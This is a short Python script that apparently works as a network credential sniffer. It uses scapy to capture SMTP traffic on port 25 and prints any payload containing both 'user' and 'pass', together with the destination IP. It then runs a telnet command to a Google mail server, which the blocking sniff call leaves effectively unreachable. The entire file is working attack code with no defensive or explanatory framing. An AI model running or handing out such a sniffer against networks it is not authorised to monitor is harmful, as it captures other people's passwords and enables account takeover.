import os

from scapy.all import sniff
from scapy.layers.inet import TCP, IP

port = 25


def packet_callback(packet):
    if payload := packet[TCP].payload:
        mypacket = str(payload)
        if 'user' in mypacket.lower() and 'pass' in mypacket.lower():
            print(f'[*] Destination: {packet[IP].dst}')
            print(f'[*] {str(payload)}')


def main():
    sniff(filter=f'tcp port {port}', prn=packet_callback, store=0)
    os.system(f'telnet gmail-smtp-in.l.google.com {port}')


if __name__ == '__main__':
    main()
